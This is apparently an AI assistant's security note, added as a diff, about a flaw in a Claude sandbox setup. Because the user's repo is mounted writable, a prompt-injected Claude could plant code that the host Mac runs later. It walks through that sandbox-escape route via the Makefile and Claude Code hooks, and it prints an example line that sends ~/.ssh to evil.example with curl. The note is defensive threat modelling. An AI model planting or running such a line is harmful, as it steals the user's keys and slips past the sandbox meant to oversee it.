@@ -1,0 +1,40 @@
+author: endreulberg
+role: assistant
+timestamp: 2026-11-21T11:09:06Z
+session: 65ce0d37-90f3-444e-87a8-31d5665c9866
+
+## The problem, step by step
+
+**1. What the sandbox protects.** Claude in the sandbox is treated as untrusted. It reads web pages, issues and dependencies, and any of those can carry instructions meant to trick it (prompt injection). The sandbox makes sure that even a tricked Claude can't reach your Mac: not your SSH keys, not your logins, not your files outside the repo.
+
+**2. What I changed today (D80).** Cilium can't run in the sandbox's kernel, so `make up` has to run on your Mac. For your Mac's cluster to see Claude's edits, I gave the sandbox your actual repo folder, writable, instead of a private copy.
+
+**3. Why that opens a hole.** That folder isn't only data. Parts of it are code your Mac runs on its own, outside the sandbox:
+
+| File in the repo | When your Mac runs it | With what access |
+|---|---|---|
+| `Makefile` | when you type `make up` | everything you have: your home folder, SSH keys, your `gh` and `az` logins |
+| `.claude/settings.json` hooks | the next time you open Claude Code in that repo | the same, and it happens automatically |
+| `.mcp.json` | the same: Claude Code starts these commands | the same |
+| `sandbox/sandbox`, `sandbox/github-token` (platform repo) | when the sandbox starts or renews its GitHub token | Claude's Azure session (it signs with the GitHub app's key) |
+
+**4. A concrete example.** Say Claude in the sandbox reads an issue containing a hidden instruction. It adds one line to the `Makefile`:
+
+```
+up: ; tar czf - ~/.ssh | curl -T - https://evil.example ; ...
+```
+
+It doesn't need to send anything from inside the sandbox, so the network block never comes into play. The next time you run `make up`, your Mac runs that line with your rights. The same goes for a hook in `.claude/settings.json`: you open Claude Code, and the hook runs before you've seen the change.
+
+**5. Why the clone avoided this.** With `--clone`, Claude works on its own copy. Your folder is mounted read-only, and Claude's commits reach you only as a branch, through GitHub or the sandbox's git remote. A planted line then has to pass your review before it runs anywhere. It's the same as a PR from a stranger: you look first, then you run it.
+
+**6. Why I didn't see it at first.** I focused on what the sandbox can reach. The danger here goes the other way: what the sandbox leaves behind for your Mac to run later.
+
+## The choice
+
+So the open question is how Claude gets a cluster to test against without your Mac ever running unreviewed code:
+1. **Clone, plus a small VM of Claude's own:** Claude runs `make up` itself in a VM that holds none of your files. This keeps the full loop: code, cluster, Grafana, PR.
+2. **Clone, with no cluster for Claude:** Claude codes and runs unit tests. You run `make up` after reviewing its branch.
+3. **Keep the mount:** accept that any edit can run on your Mac.
+
+I recommend 1.
